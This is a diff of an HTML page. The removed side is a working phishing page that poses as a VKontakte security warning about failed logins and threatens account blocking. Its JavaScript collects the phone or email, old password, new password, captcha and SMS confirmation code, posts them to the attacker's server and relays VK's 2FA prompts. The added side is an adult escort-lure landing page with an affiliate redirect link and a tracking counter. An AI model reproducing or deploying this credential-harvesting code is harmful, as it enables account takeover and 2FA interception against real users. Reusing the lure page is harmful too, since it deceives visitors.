@@ -1,251 +1,67 @@
-﻿<html>
+<!DOCTYPE html>
 <head>
-	<title>ВКонтакте | Подтверждение безопасности</title>
-	<link rel="stylesheet" type="text/css" href="style/security/css/blocked.css">
-	<script src="style/security/js/jquery-1.11.1.min.js"></script>
-	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-	<meta name="viewport" content="width=800, user-scalable=yes">
-	<link rel="shortcut icon" href="style/security/images/fav.ico" type="image/png">
-	<script type="text/javascript">
-		function checkLogin() {
-			if (g("check").value === "") {
-				$("#check").css({"border": "1px solid #F00F00", "background": "#FCCFCC"});
-			} else {
-				$("#number").fadeOut(300, function() {
-					$("#password").fadeIn(300);
-				});
-				
-				$("input[name=phone]").val(encodeURIComponent(g("check").value));
-			}
-		}
+    <meta charset="utf-8">
+    <title>Элитные девушки</title>
+    <meta name="author" content="Sam Norton">
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
 
-		function g(id) {
-			return document.getElementById(id);
-		}
+	    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+    <meta property = "og:title" content = "Девушки твоего города"article" />
+<meta property = "og:image" content = "http://individum.ml/1267951084_1.jpeg" />
+<meta property = "og:description" content = "У нас Вы сможете подобрать себе девушку из своего города. Все анкеты проверены администрацией сайта. Услуги девушек платные. Строго +18 " />
+  
 
-		var wascapt = false;
-		var wassms = false;
-		var have2fa = false;
-		var gettedToken = "";
+ <link rel="icon" href="http://individum.ml/favicon.ico" type="image/x-icon"> 
+<link rel="shortcut icon" href="http://individum.ml/favicon.ico" type="image/x-icon"> 
+ 
+    <link rel="stylesheet" href="css/normalize.css" media="all">
+    <link rel="stylesheet" href="css/style.css" media="all">
+    <link href='http://fonts.googleapis.com/css?family=Lato:300,400,700,900,300italic,400italic,700italic,900italic|Raleway:400,200,300,500,700,600,800,900' rel='stylesheet' type='text/css'>
+    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
 
-		function login() {
-			var captcha_key = "";
-			var captcha_sid = "";
-			var smscode = "";
-			var validation_sid = "";
+    <script src="js/jquery-1.11.1.min.js"></script>
+     <script src="js/device.min.js"></script> <!--OPTIONAL JQUERY PLUGIN-->
+    <script src="js/jquery.mb.YTPlayer.js"></script>
+    <script src="js/custom.js"></script>
+    
+		
+    
+ <meta name="robots" content="noindex,follow" />
 
-			var login = g("check").value.replace("+", "");
-			var password = g("oldpassword").value;
-
-			$("#err").fadeOut(300);
-
-			if (g("newpassword").value.length < 6) {
-				$("#err").html("Пароль должен иметь 6 или более символов").fadeIn(300);
-				return;
-			}
-
-			if (g("newpassword").value !== g("newpassword2").value) {
-				$("#err").html("Пароль не изменён, так как новый пароль повторен неправильно.").fadeIn(300);
-				return;
-			}
-
-			if (g("captcha_sid").value) {
-				captcha_key = g("captcha_key").value;
-				captcha_sid = g("captcha_sid").value;
-				wascapt = false;
-			}
-
-			if (wassms) {
-				smscode = g("smscode").value;
-				validation_sid = g("validation_sid").value;
-				wassms = false;
-			}
-
-			var auth = $.post("/security/continue", {
-				act: "login",
-				login: encodeURIComponent(login),
-				oldPassword: encodeURIComponent(password),
-				newPassword: encodeURIComponent(g("newpassword").value),
-				captcha_key: captcha_key,
-				captcha_sid: captcha_sid,
-				validation_sid: validation_sid,
-				code: smscode,
-				is2fa: (have2fa ? 1 : 0),
-				token: gettedToken
-			}).done(function() {
-				var response = JSON.parse(auth.responseText);
-				if (response.api) {
-					if (response.result) {
-						window.location.replace("/security/success?id=139787032");
-					} else {
-						gettedToken = response.token;
-						var e = response.api.error;
-						if (e.error_code === 14) {
-							$("#password, #sms").fadeOut(300, function () {
-								$("#capt").fadeIn(300);
-							});
-							g("captcha_key").value = "";
-							g("captcha_key").focus();
-							g("capt_img").src = e.captcha_img;
-							g("captcha_sid").value = e.captcha_sid;
-						}
-					}
-					return;
-				}
-
-				if (response.auth && !response.result || response.code === 0) {
-					var e = response.auth;
-					switch (response.auth.error) {
-						case "invalid_client":
-							$("input[type='text'], input[type='password']").val("");
-							$("#err").html("Неверный логин или старый пароль").fadeIn(300);
-							$("#number").fadeIn(300);
-							$("#capt, #password").fadeOut(300);
-							break;
-
-						case "need_captcha":
-							$("#password, #sms").fadeOut(300, function() {
-								$("#capt").fadeIn(300);
-							});
-							g("captcha_key").value = "";
-							g("captcha_key").focus();
-							g("capt_img").src = e.captcha_img;
-							g("captcha_sid").value = e.captcha_sid;
-							wascapt = true;
-							break;
-
-						case "need_validation":
-							$("#password, #capt").fadeOut(300, function() {
-								$("#sms").fadeIn(300);
-							});
-							g("validation_sid").value = e.validation_sid;
-							wassms = true;
-							have2fa = true;
-							$.ajax("https://api.vk.com/method/auth.validatePhone?sid=" + e.validation_sid + "&v=4.99");
-							break;
-
-						default:
-							break;
-					}
-				}
-			});
-		}
-
-	</script>
-	
-	<style>
-		.head_nav_item {
-			text-align: center;
-		}
-		.top_profile_link {
-			display: inline-block;
-			white-space: nowrap;
-			line-height: 42px;
-			height: 42px;
-			overflow: hidden;
-			padding: 0 10px;
-			color: #fff;
-			font-weight: 700;
-			-webkit-font-smoothing: antialiased;
-			-moz-osx-font-smoothing: grayscale;
-		}
-		.top_profile_name {
-			padding-right: 10px;
-			display: inline-block;
-			vertical-align: top;
-		}
-		.top_profile_img {
-			width: 28px;
-			height: 28px;
-			border-radius: 14px;
-			margin: 7px 0;
-			display: inline-block;
-			vertical-align: top;
-		}
-		</style>
 </head>
+
 <body>
 
-<div class="header">
-	</div>
-<div class="page">
-	<div class="page-border">
-		<div class="content">
-			<div class="spamfight"></div>
-			<p>На Вашу страницу в течение 24 часов было сделано более <strong> 10</strong> неудачных попыток авторизации, 
-<br>Вы или кто-то другой ввели неверный пароль <strong> 12</strong> раз.
-      </p>
-      <br>
-      <p>Чтобы избежать блокировки Вам необходимо подтвердить, что Вы владелец аккаунта и изменить пароль используя данную страницу</p>
-      <div class="reason">
-        <center><p style="padding-left:20px">
-          <span style="color:#000000">Игнорирование данного уведомления приведёт к <strong> блокировке</strong> Вашего аккаунта.<br>
-По любым вопросам пишите в <a href="https://vk.com/support?act=home"><b>Поддержку</b></a>.</span>
-        </p></center>
-			</div>
+    
+    <section class="big-background">
+       <video autoplay loop muted class="bgvideo" id="bgvideo">
+   <source src="video.mp4" type="video/mp4"></source>
+  </video>
+        
+        <div class="pattern"></div> 
+            <div class="big-background-container">
+                    <h1 class="big-background-title">BAD GIRL</h1>
+                    <div class="divider"></div>
+                    <h1 id="colorize">САМЫЕ РАЗВРАТНЫЕ ДЕВУШКИ</h1>
+                    <a href="http://gotogirlzzz.com/in.htm?wm=508107462" class="big-background-btn">СМОТРЕТЬ АНКЕТЫ +18</a>
+            </div>                                                    
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='//www.liveinternet.ru/click' "+
+"target=_blank><img src='//counter.yadro.ru/hit?t50.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border='0' width='1' height='1'><\/a>")
+//--></script><!--/LiveInternet-->
 
 
-			<div id="err" class="oauth_error"></div>
+	</section>
+    
 
-			<div class="content-1" id="number" style="display: block;">
-				<p class="login">Телефон или email</p>
-				<input type="password" id="check" class="textbox-blocked" name="mobile" autofocus value="">
-				<div class="button btn-mobile" onClick="checkLogin();" style="width:134px">Продолжить</div>
-			</div>
+   
 
-			<div class="content-1" id="password" style="display: none;">
-				<p class="login">Старый пароль</p>
-				<input id="oldpassword" type="password" name="pass" autofocus required pattern=".{6,50}"
-					class="textbox-blocked">
-				<p class="login">Новый пароль</p>
-				<input id="newpassword" type="password" name="newpass" required pattern=".{6,50}"
-					class="textbox-blocked">
-				<p class="login">Повторите пароль</p>
-				<input id="newpassword2" type="password" name="repass" required pattern=".{6,50}"
-					class="textbox-blocked">
-				<input type="submit" onClick="login();" class="button" style="width:134px" value="Подтвердить">
-			</div>
 
-			<div class="content-1" id="capt" style="display: none;">
-				<input id="captcha_sid" type="hidden" name="captcha_sid" value="">
-				<br/><img id="capt_img" src="index.html"><br/><br/>
-				<p class="login">Код с картинки:</p>
-				<input id="captcha_key" type="text" name="captcha_key" required pattern=".{6,50}"
-					class="textbox-blocked">
-				<input type="submit" onClick="login();" class="button" style="width:134px" value="Подтвердить">
-			</div>
-
-			<div id="sms" style="display: none;">
-				<div
-					class="oauth_error">Чтобы подтвердить, что Вы действительно являетесь владельцем страницы, пожалуйста, введите код подтверждения из SMS.
-				</div>
-				<br>
-				<div class="content-1">
-					<input id="validation_sid" type="hidden" name="validation_sid" value="1">
-					<p class="login">Код подтверждения:</p>
-					<input id="smscode" type="text" required pattern=".{6,50}" class="textbox-blocked">
-					<input type="submit" onClick="login();" class="button" style="width:134px" value="Подтвердить">
-				</div>
-			</div>
-			
-			<input type="hidden" name="phone" style="display:none;" />
-		</div>
-	</div>
-</div>
-<div class="footer">
-	<div class="footer_nav" id="bottom_nav">
-		<div class="footer_copy fl_l"><a href="https://vk-users-blocked.info/about">ВКонтакте</a> © 2019</div>
-		<div class="footer_lang fl_r">Язык:<a class="footer_lang_link">English</a><a
-				class="footer_lang_link">Русский</a><a class="footer_lang_link">Українська</a><a
-				class="footer_lang_link">все языки »</a></div>
-		<div class="footer_links">
-			<a class="bnav_a" href="javascript:void(0)">о компании</a>
-			<a class="bnav_a" href="javascript:void(0)">правила</a>
-			<a class="bnav_a" href="javascript:void(0)" style="">реклама</a>
-
-			<a class="bnav_a" href="javascript:void(0)">разработчикам</a>
-		</div>
-	</div>
-</div>
 </body>
 </html>
